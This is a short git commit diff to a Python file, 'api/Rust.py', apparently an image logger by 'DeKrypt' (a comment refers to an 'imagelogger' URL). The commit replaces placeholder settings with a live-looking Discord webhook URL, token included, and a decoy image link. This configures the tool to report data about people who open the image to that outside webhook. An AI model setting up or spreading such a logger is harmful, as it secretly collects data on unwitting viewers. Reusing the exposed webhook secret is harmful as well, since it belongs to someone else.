d91bd7cc097bd4ceab25f13be7454fd964dc46ab
BlazingCore <158478350+smxkiller@users.noreply.github.com>
2025-02-12 22:22:40 +0300

    Update Rust.py

--- api/Rust.py
+++ api/Rust.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1339315022358380565/eyDE21_fKEEnuOQeyZO61rRDd0yF2ErJDO-EIkSEuteLGvEO00eKjLkNvrZSDbJxnvo2",
+    "image": "https://static.vecteezy.com/system/resources/previews/003/542/126/non_2x/png-image-squares-background-free-vector.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
